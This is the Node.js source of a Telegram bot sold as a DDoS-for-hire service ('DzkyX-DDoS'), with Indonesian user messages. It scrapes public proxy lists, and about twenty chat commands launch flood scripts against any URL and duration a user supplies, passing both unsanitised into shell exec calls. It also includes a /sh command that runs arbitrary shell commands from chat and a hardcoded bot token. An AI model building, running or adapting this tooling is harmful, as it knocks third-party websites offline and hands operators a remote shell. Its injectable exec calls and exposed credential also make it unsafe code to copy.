const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '7531161116:AAGQI1PDMYgtaOAHshtAv0FpaS_gxnbBFSA';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);

console.log(figlet.textSync('DzkyX-DDoS', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Scraper\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Scraper\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Update', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Hallo ${name}, Selamat Datang Di Bot DDoS DzkyX-DDoS!!
  
Nama Bot : DzkyX-DDoS
Developer : @DirtyHead5
Version : 1.3
  
── 𖥔DDoS Methods
『✓』--> /bypass [ Url ] [ Time ]
『✓』--> /browser [ Url ] [ Time ]
『✓』--> /botnet [ Url ] Time ]
『✓』--> /tls [ Url ] [ Time ]
『✓』--> /tlsflood [ Url ] [ Time ]
『✓』--> /tornado [ Url ] [ Time ]
『✓』--> /duar [ Url ] [ Time ]
『✓』--> /gecko [ Url ] [ Time ]
『✓』--> /bypassv2 [ Url ] [ Time ]
『✓』--> /raw [ Url ] [ Time ]
『✓』--> /bomb [ Url ] [ Time ]
『✓』--> /ghost [ Url ] [ Time ]
『✓』--> /chaptca [ Url ] [ Time ]
『✓』--> /thunder [ Url ] [ Time ]
『✓』--> /storm [ Url ] [ Time ]
『✓』--> /floodvip [ Url ] [ Time ]
『✓』--> /kill [ Url ] [ Time ]
『✓』--> /strike [ Url ] [ Time ]
『✓』--> /cloudflarehard [ Url ] [ Time ]
『✓』--> /ninja [ Url ] [ Time ]

── 𖥔Info Web
=> /info [ Url ]

── 𖥔Proxy Scraper
=> /upproxy

── 𖥔Buy Script
=> /script

── 𖥔Cek Status Bot
=> /cekbot

── 𖥔Cek IP Address
=> /cekip [ IP ]

── 𖥔Tinyurl Web
=> /tinyurl [ Url ]

── 𖥔Owner
=> /owner
  
DDoS Bot Simple By DzkyX-DDoS🔥🔥
  `);
});

bot.onText(/^\/botnet(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node botnet.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/gecko(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node geckold.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/duar(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node 404.js ${target} ${time} 60 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tornado(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node tornado.js POST ${target} ${time} 16 32 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node tls.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 33\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/browser(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node browser.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypass.js POST ${method} ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypassv2(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypassv2.js  ${target} ${time} 128 50 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 128\nThread: 50\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/raw(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node raw.js  ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bomb(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node BOMB.js  ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ghost(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ASTRAL.js  ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/chaptca(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node CLOUDFLARE.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/thunder(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node thunder.js ${target} ${time} 60 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/storm(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node storm.js ${target} ${time} 60 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/floodvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node XCDDOS.js ${target} ${time} 64 32 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 64\nThread: 32\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node LEZKILL.js ${target} ${time} 64 32 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 64\nThread: 32\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/strike(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node VXX.js ${target} ${time} 32 64 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 64\nThread: 32\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/cloudflarehard(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node CFSTRONG.js ${target} ${time} 32 POST proxy.txt 60`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 32\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ninja(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Nexus.js POST ${target} proxy.txt ${time} 60 32 `);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 32\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tlsflood(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Medusa.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By DzkyX-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By DzkyX-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghentikan perintah ini.');
      return;
    }
    stopProcesses(chatId);
  }
});
bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  try {
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `Terjadi kesalahan saat memperbarui proxy: ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Gagal mendapatkan informasi. Coba lagi nanti.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi API.');
 });
});
bot.onText(/\/script/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Mau Beli Script Bot DDoS?\nKlik Button Di Bawah Untuk Menghubungi Developer Bot\n\nNote : Jangan Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `https://t.me/DirtyHead5` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

